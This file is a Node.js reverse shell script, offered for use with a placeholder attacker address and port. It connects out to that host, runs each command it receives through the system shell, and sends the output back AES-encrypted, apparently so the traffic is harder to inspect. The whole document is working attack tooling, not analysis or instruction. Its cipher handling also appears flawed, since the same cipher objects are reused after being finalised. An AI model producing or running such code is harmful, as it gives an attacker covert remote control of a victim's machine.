#!/usr/bin/env node
// Node.js Advanced Reverse Shell
// Configure LHOST and LPORT before use

const net = require('net');
const crypto = require('crypto');

const LHOST = '192.168.1.100';
const LPORT = 4447;

const cipher = crypto.createCipher('aes-256-cbc', 'secret_key');
const decipher = crypto.createDecipher('aes-256-cbc', 'secret_key');

const client = new net.Socket();

client.connect(LPORT, LHOST, () => {
    console.log('Connected to attacker');
});

client.on('data', (data) => {
    const decrypted = decipher.update(data, 'hex', 'utf8') + decipher.final('utf8');

    if (decrypted.trim() === 'exit') {
        client.end();
        process.exit();
    }

    const exec = require('child_process').exec;
    exec(decrypted, (error, stdout, stderr) => {
        let output = '';
        if (error) output += error.message;
        output += stdout;
        output += stderr;

        const encrypted = cipher.update(output, 'utf8', 'hex') + cipher.final('hex');
        client.write(encrypted);
    });
});

client.on('close', () => {
    console.log('Connection closed');
});
